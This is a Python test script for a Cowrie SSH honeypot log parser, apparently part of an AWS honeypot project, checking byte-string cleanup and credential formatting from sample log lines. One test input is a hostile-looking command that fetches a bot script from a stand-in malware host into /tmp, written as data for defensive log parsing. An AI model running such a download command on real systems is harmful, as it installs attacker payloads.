import pathlib, re, sys

# Load parser without boto3
src = pathlib.Path(r"C:\Users\Dell\Documents\AWS-HaaS\Lambda Functions\CowrieLogParser.py").read_text(encoding="utf-8")
src = src.replace("import boto3", "boto3 = None")
src = src.replace("import os", "import os")
ns = {}
exec(compile(src, "CowrieLogParser.py", "exec"), ns)
parse_log_line = ns["parse_log_line"]
clean_value = ns["clean_value"]

print("=== clean_value tests ===")
cases = [
    ("b'root'", "root", "single-quoted byte repr"),
    ('b"admin123"', "admin123", "double-quoted byte repr"),
    ("b'toor'", "toor", "byte repr of toor"),
    ("'hello'", "'hello'", "ordinary single-quoted string must NOT be unwrapped"),
    ('"hello"', '"hello"', "ordinary double-quoted string must NOT be unwrapped"),
    ("hello", "hello", "plain string unchanged"),
    ("root:password", "root:password", "already-clean credential unchanged"),
    ("wget http://malware.example.com/bot.sh -O /tmp/bot.sh",
     "wget http://malware.example.com/bot.sh -O /tmp/bot.sh",
     "real command text unchanged"),
    ("echo b'not a bytes literal' > /tmp/x",
     "echo b'not a bytes literal' > /tmp/x",
     "command containing b' must NOT be stripped"),
    ("none", "none", "none sentinel unchanged"),
    ("", "", "empty string unchanged"),
    (None, None, "None unchanged"),
    (123, 123, "non-string unchanged"),
]
for inp, expected, desc in cases:
    result = clean_value(inp)
    status = "PASS" if result == expected else "FAIL (got %r)" % (result,)
    print("  %-45s %s" % (desc, status))
    assert result == expected, "%s: %r -> %r" % (desc, inp, result)

print("\n=== credential formatting tests ===")
cs = {}
cred_lines = [
    "2026-09-11T12:00:00.123456Z [HoneyPotSSHTransport,0,185.220.101.47] New connection: 185.220.101.47:44444 (10.0.0.1:22) [session: abc123]",
    "2026-09-11T12:00:00.523456Z [SSHService ssh-userauth on HoneyPotSSHTransport,0,185.220.101.47] [abc123] login attempt [b'root'/b'password'] failed",
    "2026-09-11T12:00:01.123456Z [SSHService ssh-userauth on HoneyPotSSHTransport,0,185.220.101.47] [abc123] login attempt [b'admin'/b'admin123'] failed",
]
results = []
for line in cred_lines:
    p = parse_log_line(line, cs)
    if p:
        results.append(p)

assert results[1]["input"] == "root:password", "got %r" % results[1]["input"]
assert results[2]["input"] == "admin:admin123", "got %r" % results[2]["input"]
assert "b'" not in results[1]["input"], "byte repr leaked into input"
assert "b'" not in results[2]["input"], "byte repr leaked into input"
print("  PASS: credentials display as root:password, admin:admin123")
print("  PASS: no byte-string reprs in stored credentials")

BYTES_WRAPPER = re.compile(r"^b'(.*?)'$|^b\"(.*?)\"$", re.DOTALL)
for r in results:
    for field in ("eventid", "input", "command", "src_ip", "session"):
        val = str(r[field])
        assert not BYTES_WRAPPER.match(val), "field %s is bytes repr: %r" % (field, val)
print("  PASS: no field is a bytes-repr wrapper")

print("\nALL CREDENTIAL TESTS PASSED")